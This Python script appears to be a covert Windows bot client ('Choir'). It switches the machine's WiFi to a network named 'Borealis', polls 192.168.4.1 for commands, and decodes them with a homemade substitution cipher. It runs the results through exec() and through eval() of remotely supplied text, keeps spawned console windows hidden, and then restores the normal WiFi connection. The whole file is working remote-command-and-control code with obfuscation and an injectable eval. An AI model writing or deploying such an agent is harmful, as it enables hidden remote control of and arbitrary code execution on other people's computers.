#IMPORTS
import socket, traceback, subprocess, time, os
#SETUP
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
with open('settings.txt','r') as f:
	lst_ = f.readlines()
	wifi = lst_[0].replace("\n","")
	sleepnum = int(lst_[1].replace("\n",""))
	pingnum = int(lst_[2].replace("\n",""))
	noconnection = int(lst_[3].replace("\n",""))
	connection = int(lst_[4].replace("\n",""))
	eos__ = lst_[5].replace("\n","")
commands = {}
online,success = False,False
idnum,totalnum=0,0
#FUNCTIONS
def borealis(url):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
		s.connect((url, 80))
		s.sendall(bytes(f"GET / HTTP/1.1\r\nHost:{url}\r\n\r\n", encoding='utf-8'))
		eosstr = s.recv(4096)
		s.close()
		return eosstr
	except Exception as e:
		print(e)
		return False
def decrypt(_):
	decrypttable,lst = {"14":"a","15":"b","20":"c","21":"d","22":"e","23":"f","24":"g","25":"h","30":"i","31":"j","32":"k","33":"l","34":"m","35":"n","40":"o","41":"p","42":"q","43":"r","44":"s","45":"t","50":"u","51":"v","52":"w","53":"x","54":"y","55":"z","00":'0',"01":'1',"02":'2',"03":'3',"04":'4',"05":'5',"10":'6',"11":'7',"12":'8',"13":'9',"n.":"\n"},[]
	for a,b in (_[i:i+2] for i in range(0, len(_), 2)):
		if a+b in decrypttable:
			lst.append(decrypttable[a+b])
		else:
			lst.append(b)
	__ = "".join(lst)
	return __
def getfunc(prefix,suffix):
	with open("funcdoc.eos","r") as f:
		eosstr = f.readlines()[0]
		eos_ = decrypt(eosstr)
		print(eos_.replace('\t', '   '))
	exec(eos_)
	if prefix in locals():
		result = locals()[prefix](suffix)
		return result
	else:
		return 404
#MAINLOOP
print("Choir Online")
while not online:
	try:
		subprocess.call('netsh wlan add profile filename="borealis.xml"', startupinfo=si)
		subprocess.call("netsh wlan connect Borealis", startupinfo=si)
		time.sleep(pingnum)
		idnum = int(str(borealis("192.168.4.1")).split(".:")[0].split("'")[-1])
		subprocess.call(f"netsh wlan connect {wifi}", startupinfo=si)
		time.sleep(noconnection-pingnum)
		online = True
	except:
		time.sleep(noconnection-pingnum)
while True:
	subprocess.call('netsh wlan add profile filename="borealis.xml"', startupinfo=si)
	subprocess.call("netsh wlan connect Borealis", startupinfo=si)
	time.sleep(sleepnum)
	eosstr = borealis("192.168.4.1")
	print(eosstr)
	if eosstr == False:
		subprocess.call(f"netsh wlan connect {wifi}", startupinfo=si)
		time.sleep(noconnection-sleepnum)
		if not success:
			sleepnum=sleepnum+0.5
		continue
	subprocess.call(f"netsh wlan connect {wifi}", startupinfo=si)
	eosstr = str(eosstr).replace("b'","")[0:-3].split(".:")[1]
	totalnum = str(eosstr).replace("b'","")[0:-3].split(".:")[0]
	for i in eosstr.split(";,"):
		prefix,suffix=i.split(":.")
		commands[prefix] = suffix
	success = True
	for prefix, suffix in commands.items():
		try:
			prefix_,suffix_ = decrypt(str(prefix)),decrypt(str(suffix))
			if eos__ == "True":
				getfunc(prefix_,suffix_)
			else:
				import funcdoc
				eval(f"funcdoc.{prefix_}('{suffix_}')")
		except:
			continue
	commands = {}
	time.sleep(connection-sleepnum)
